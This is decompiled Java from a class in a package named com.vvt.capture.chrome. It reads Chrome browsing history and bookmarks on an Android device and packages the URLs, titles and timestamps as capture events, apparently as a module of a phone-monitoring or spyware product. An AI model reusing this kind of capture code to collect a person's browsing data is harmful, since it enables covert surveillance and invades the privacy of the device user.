package com.vvt.capture.chrome.c;

import android.content.ContentResolver;
import android.net.Uri;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.chrome.ChromeUrlData;
import com.vvt.capture.chrome.ChromeUrlData.UrlType;
import com.vvt.d.d;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class e
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private ContentResolver c;
  
  public e(ContentResolver paramContentResolver)
  {
    this.c = paramContentResolver;
  }
  
  private ChromeUrlData a(com.vvt.d.e parame)
  {
    ChromeUrlData localChromeUrlData = new com/vvt/capture/chrome/ChromeUrlData;
    localChromeUrlData.<init>();
    long l = parame.a();
    localChromeUrlData.a(l);
    l = System.currentTimeMillis();
    localChromeUrlData.b(l);
    Object localObject = parame.d();
    localChromeUrlData.a((String)localObject);
    l = parame.b();
    localChromeUrlData.c(l);
    boolean bool = parame.c();
    if (bool) {}
    for (localObject = ChromeUrlData.UrlType.BOOKMARKS;; localObject = ChromeUrlData.UrlType.HISTORY)
    {
      localChromeUrlData.a((ChromeUrlData.UrlType)localObject);
      localObject = parame.e();
      localChromeUrlData.b((String)localObject);
      return localChromeUrlData;
    }
  }
  
  public g a()
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = Uri.parse(a.a);
    ContentResolver localContentResolver = this.c;
    localObject = d.a((Uri)localObject, localContentResolver);
    if (localObject != null)
    {
      boolean bool2 = a;
      if (!bool2) {}
    }
    for (long l = ((com.vvt.d.e)localObject).b();; l = -1)
    {
      FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
      localFxSimpleEventReference.<init>();
      localObject = Long.valueOf(l);
      localFxSimpleEventReference.setReference((Long)localObject);
      bool1 = a;
      if (bool1) {}
      return localFxSimpleEventReference;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = Uri.parse(a.a);
    Object localObject2 = this.c;
    localObject1 = d.a(paramInt, (Uri)localObject1, (ContentResolver)localObject2);
    localObject2 = new java/util/ArrayList;
    ((ArrayList)localObject2).<init>();
    Iterator localIterator = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.d.e)localIterator.next();
      localObject1 = a((com.vvt.d.e)localObject1);
      ((List)localObject2).add(localObject1);
    }
    if (localObject2 != null)
    {
      int i = ((List)localObject2).size();
      if (i > 0)
      {
        bool2 = a;
        if (bool2) {}
        localArrayList.addAll((Collection)localObject2);
      }
    }
    boolean bool2 = a;
    if (bool2) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool2 = paramg1 instanceof FxSimpleEventReference;
    if (bool2)
    {
      bool2 = paramg2 instanceof FxSimpleEventReference;
      if (bool2)
      {
        Object localObject1 = Uri.parse(a.a);
        Object localObject2 = this.c;
        localObject1 = d.a((Uri)localObject1, (ContentResolver)localObject2);
        localObject2 = new java/util/ArrayList;
        ((ArrayList)localObject2).<init>();
        localObject1 = a((com.vvt.d.e)localObject1);
        ((List)localObject2).add(localObject1);
        if (localObject2 != null)
        {
          int i = ((List)localObject2).size();
          if (i > 0)
          {
            bool3 = a;
            if (bool3) {}
            localArrayList.addAll((Collection)localObject2);
          }
        }
      }
    }
    boolean bool3 = a;
    if (bool3) {}
    return localArrayList;
  }
  
  public List b()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = Uri.parse(a.a);
    Object localObject2 = this.c;
    long l1 = 0L;
    int i = 1;
    localObject1 = d.a((Uri)localObject1, (ContentResolver)localObject2, l1, i);
    localObject2 = new java/text/SimpleDateFormat;
    ((SimpleDateFormat)localObject2).<init>("dd/MM/yy HH:mm:ss");
    Iterator localIterator = ((List)localObject1).iterator();
    for (;;)
    {
      boolean bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      localObject1 = (com.vvt.d.e)localIterator.next();
      ChromeUrlData localChromeUrlData = new com/vvt/capture/chrome/ChromeUrlData;
      localChromeUrlData.<init>();
      long l2 = ((com.vvt.d.e)localObject1).a();
      localChromeUrlData.a(l2);
      l2 = ((com.vvt.d.e)localObject1).b();
      localChromeUrlData.b(l2);
      Object localObject3 = new java/sql/Date;
      long l3 = ((com.vvt.d.e)localObject1).b();
      ((java.sql.Date)localObject3).<init>(l3);
      localObject3 = ((SimpleDateFormat)localObject2).format((java.util.Date)localObject3);
      localChromeUrlData.c((String)localObject3);
      localObject3 = ((com.vvt.d.e)localObject1).d();
      localChromeUrlData.a((String)localObject3);
      localObject3 = ChromeUrlData.UrlType.BOOKMARKS;
      localChromeUrlData.a((ChromeUrlData.UrlType)localObject3);
      localObject3 = ((com.vvt.d.e)localObject1).e();
      localChromeUrlData.b((String)localObject3);
      l2 = ((com.vvt.d.e)localObject1).b();
      localChromeUrlData.c(l2);
      localArrayList.add(localChromeUrlData);
    }
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/MyUncaughtExceptionHandler/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */